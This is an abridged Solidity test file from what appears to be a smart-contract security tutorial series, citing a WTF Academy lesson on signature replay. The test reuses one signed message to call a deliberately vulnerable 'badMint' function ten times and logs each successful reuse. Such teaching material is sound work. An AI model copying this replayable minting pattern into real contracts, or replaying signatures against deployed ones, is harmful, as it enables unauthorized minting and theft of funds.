...
/**
    ...
    ref https://www.wtf.academy/solidity-104/SignatureReplay/

    command `forge test -vvv --contracts ./src/wtf/S06SignatureReplay.sol`
 */
...
contract ContractTest is Test {
    function testSignatureReplay() public {
        ...
        SigReplay sigReplay = new SigReplay();

        bytes32 digest = sigReplay.toEthSignedMessageHash(
            sigReplay.getMessageHash(aliceAddr, 1000)
        );
        ...
        for (uint i; i < 10; ) {
            sigReplay.badMint(aliceAddr, 1000, signature);
            unchecked {
                ++i;
            }
            emit log_named_uint("count of signature used successfully", i);
        }
    }
}
